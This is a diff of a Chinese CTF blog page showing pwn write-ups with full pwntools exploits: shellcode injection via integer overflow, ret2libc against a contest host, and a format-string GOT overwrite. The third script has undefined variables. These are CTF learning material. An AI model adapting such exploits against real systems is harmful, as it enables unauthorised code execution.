@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Week 2, J1ton9&#39;s blog">
+    <meta name="keywords" content="Week 2, PWN,linux等">
     <meta name="description" content="HGAME PWNezshellcode存在整数溢出，unsigned v4,输入-1，然后给一个shellcode
 找一个shellcode放里面
 shellcode来源：https://blog.csdn.net/mcmuyanga/a">
@@ -54,9 +54,9 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 7.1.1">
+<meta name="generator" content="Hexo 7.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 <body>
@@ -175,7 +175,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
         <div class="logo-name">J1ton9&#39;s blog</div>
         <div class="logo-desc">
             
-            Never really desperate, only the lost of the soul.
+            本网站主要记录平时所学,分享平时学到的知识
             
         </div>
     </div>
@@ -388,7 +388,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    427
+                    435
                 </div>
                 
 
@@ -400,6 +400,9 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -409,17 +412,102 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
 <p>找一个shellcode放里面</p>
 <p>shellcode来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p>
 <p>exp:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(log_level='debug',arch='amd64',os='linux')</span><br><span class="line">p=process('./ezshellcode')</span><br><span class="line"></span><br><span class="line">p.sendlineafter("of your shellcode:",b'-1')</span><br><span class="line"></span><br><span class="line">shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H</span><br><span class="line">0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1</span><br><span class="line">n0J0h0a070t"</span><br><span class="line"></span><br><span class="line">p.sendafter("input your shellcode:",shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import*
+
+context(log_level='debug',arch='amd64',os='linux')
+p=process('./ezshellcode')
+
+p.sendlineafter("of your shellcode:",b'-1')
+
+shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H
+0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1
+n0J0h0a070t"
+
+p.sendafter("input your shellcode:",shellcode)
+
+p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p>
 <p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p>
 <p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])</span><br><span class="line"></span><br><span class="line">p = remote('106.14.57.14',30931)</span><br><span class="line"></span><br><span class="line">elf = ELF('./vuln')</span><br><span class="line">libc = cdll.LoadLibrary('./libc.so.6')</span><br><span class="line"></span><br><span class="line">libc.srand(0)  #找种子</span><br><span class="line"></span><br><span class="line">p.sendafter("thy name", b'a' * 0x12)</span><br><span class="line"></span><br><span class="line">for i in range(0,99):</span><br><span class="line">    m = libc.rand()%100+1</span><br><span class="line">    # print(m)</span><br><span class="line">    p.sendafter("guess the number:",p64(m)) </span><br><span class="line">    </span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line">puts_got = elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x401423</span><br><span class="line">ret = 0x40101A</span><br><span class="line"></span><br><span class="line">read = 0x401250 </span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">p.sendafter("thy brilliant mind.",payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']</span><br><span class="line">                 </span><br><span class="line"># print("libc_base=",hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(libc_base+next(libc.search(b'/bin/sh')))</span><br><span class="line">payload+=p64(libc_base+libc.sym['system'])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+from ctypes import *
+
+context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+
+p = remote('106.14.57.14',30931)
+
+elf = ELF('./vuln')
+libc = cdll.LoadLibrary('./libc.so.6')
+
+libc.srand(0)  #找种子
+
+p.sendafter("thy name", b'a' * 0x12)
+
+for i in range(0,99):
+    m = libc.rand()%100+1
+    # print(m)
+    p.sendafter("guess the number:",p64(m)) 
+    
+libc = ELF('./libc.so.6')
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+
+pop_rdi = 0x401423
+ret = 0x40101A
+
+read = 0x401250 
+
+payload=b'a'*0x38
+payload+=p64(pop_rdi)
+payload+=p64(puts_got)
+payload+=p64(puts_plt)
+payload+=p64(read)
+
+p.sendafter("thy brilliant mind.",payload)
+
+libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']
+                 
+# print("libc_base=",hex(libc_base))
+
+payload=b'a'*0x38
+payload+=p64(ret)
+payload+=p64(pop_rdi)
+payload+=p64(libc_base+next(libc.search(b'/bin/sh')))
+payload+=p64(libc_base+libc.sym['system'])
+
+p.sendline(payload)
+
+p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p>
 <p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p>
 <p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386', os='linux')</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line">elf = ELF(pwn)</span><br><span class="line">#rop = ROP(pwn)</span><br><span class="line"></span><br><span class="line">libc =elf.libc</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"your name?\n")</span><br><span class="line"></span><br><span class="line">fini = 0x0804979C  </span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">printf_addr = elf.got['printf']</span><br><span class="line">main = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byte</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"What's your name?\n")</span><br><span class="line"></span><br><span class="line">io.sendline(b'/bin/sh\x00')</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+context(log_level='debug',arch='i386', os='linux')
+
+p = process('./pwn')
+elf = ELF(pwn)
+#rop = ROP(pwn)
+
+libc =elf.libc
+
+io.recvuntil(b"your name?\n")
+
+fini = 0x0804979C  
+system_addr = elf.plt['system']
+printf_addr = elf.got['printf']
+main = elf.symbols['main']
+
+payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byte
+print(payload)
+
+io.sendline(payload)
+
+io.recvuntil(b"What's your name?\n")
+
+io.sendline(b'/bin/sh\x00')
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -686,8 +774,12 @@ gitment.render('gitment-content');
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            J1ton9
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Markdown/" class="post-category">
+                                    Markdown
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -699,16 +791,16 @@ gitment.render('gitment-content');
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/02/06/week%202/">
+                <a href="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Week 2">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="刷题记录">
                         
-                        <span class="card-title">Week 2</span>
+                        <span class="card-title">刷题记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -723,13 +815,16 @@ gitment.render('gitment-content');
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            J1ton9
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Markdown/" class="post-category">
+                                    Markdown
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -781,6 +876,9 @@ gitment.render('gitment-content');
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
 
 
 <!-- 代码语言 -->
@@ -1166,6 +1264,15 @@ $(function () {
     
     
     
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
 
     <!-- 雪花特效 -->
     
@@ -1220,6 +1327,37 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+    <!-- 天气接口控件 洪卫 shw2018 add 2019.09.09 --> 
+     
+        <!-- 天气接口--> 
+<script type="text/javascript"> 
+    WIDGET = {FID: '1tFpFZ5Mtj'} 
+</script> 
+<!-- <script type="text/javascript"
+src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> --> 
+<script type="text/javascript"> 
+    //只在桌面版网页启用特效 
+    var windowWidth = $(window).width(); 
+    if (windowWidth > 768) { 
+        document.write('<script type="text/javascript"
+src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>'); 
+    } 
+    </script>
+ 
+    
+
+     
+        <script type="text/javascript"> 
+            //只在桌面版网页启用特效 
+            var windowWidth = $(window).width(); 
+            if (windowWidth > 768) { 
+                document.write('<script type="text/javascript" src="/js/sakura.js">
+    </script>'); 
+            } 
+            </script> 
+    
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-z16"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false});</script></body>
 
 </html>
